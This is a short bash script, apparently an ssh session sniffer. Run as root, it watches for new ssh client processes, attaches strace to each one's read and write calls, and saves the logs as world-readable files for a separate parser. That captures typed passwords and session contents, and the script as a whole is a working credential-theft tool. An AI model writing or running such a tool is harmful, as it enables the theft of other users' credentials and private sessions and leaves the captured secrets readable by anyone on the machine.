#!/bin/bash
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root, use sudo "$0" instead" 1>&2
   exit 1
fi
IFS=$'\n'
oldProcess=()
echo "This script requires python for strace log parsing."
echo "Waiting for ssh connection, Ctrl+C to exit"
while [ 1 ]
do
	sleep 0.5
	for oldP in ${oldProcess[@]}
	do
		found=0
		for newP in ${newProcess[@]}
		do
			if [[ $oldP == $newP ]]
			then
				found=1
			fi
		done
		if [[ $found == 0 ]]
		then
			delete=($oldP)
			oldProcess=( "${oldProcess[@]/$delete}" )
		fi
	done
	newProcess=($(pgrep -af '^ssh ' | cut -d' ' -f1))
	for newP in ${newProcess[@]}
	do
			found=0
			for oldP in ${oldProcess[@]}
			do	
				if [[ $oldP == $newP ]]
					then
					found=1
				fi
			done
			if [[ $found == 0 ]]
				then
				echo "Process $newP found, working!"
				oldProcess+=($newP)
				{
				if strace -etrace=write,read -p $newP -o output-$newP 
					then
					chmod 777 output-$newP
					python text.py output-$newP
					echo "strace process $newP done!"	
				else
					echo "strace process $newP error!" 1>&2
				fi
				} &
			fi
	done
done